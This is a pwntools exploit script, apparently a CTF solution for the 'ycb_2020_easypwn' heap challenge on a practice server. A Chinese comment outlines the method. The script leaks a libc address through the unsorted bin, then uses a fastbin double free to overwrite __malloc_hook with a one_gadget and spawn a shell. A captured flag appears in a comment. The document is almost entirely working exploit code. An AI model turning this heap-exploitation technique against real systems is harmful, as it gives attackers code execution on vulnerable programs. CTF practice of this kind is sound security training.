#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 27786

elfpath = './ycb_2020_easypwn_patched'
ldpath = './ld-2.23.so'
libcpath = './libc-2.23.so'
e = ELF(elfpath)
context.binary = e
libc = ELF(libcpath)

context.binary = e

if args.LOCAL:
    p = process([e.path])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{}: {}".format(func, hex(address)))


def command(c):
    ru(b'Your choice : ')
    sl(str(c).encode())


def add(size, name, content):
    command(1)
    ru(b'size of the game\'s name: \n')
    sl(str(size).encode())
    ru(b'game\'s name:\n')
    s(name)
    ru(b'game\'s message:\n')
    sl(content)


# def edit(index, size, content):


def free(index):
    command(3)
    ru(b'game\'s index:\n')
    sl(str(index).encode())


def show(index):
    command(2)


# start pwning
'''
glibc2.23 没有edit函数，可以double free，那就说明可以任意写
想想怎么泄露
送入unsorted bin再分配不就泄露libc了吗
'''

add(0x80, b'a', b'a')
add(0x60, b'a', b'a')
add(0x60, b'a', b'a')
add(0x60, b'a', b'a')
free(0)

add(0x50, b'b'*8, b'c')
show(0)
malloc_hook = u64(ru7f()[-6:] + b'\x00'*2) - 0x58 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
leak("libcbase", libc_base)
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

# double free on fastbin

free(1)
free(2)
free(1)

if args.LOCAL:
    gdb.attach(p)

add(0x60, p64(malloc_hook - 0x23), b'a')
add(0x60, b'a', b'a')
add(0x60, b'a', b'a')
add(0x60, b'a'*0x13 + p64(one_gadgets[1] + libc_base), b'a')
command(1)
# flag{712d9b70-2d24-4ae1-a256-70ff1ff0ae21} easy!

shell()
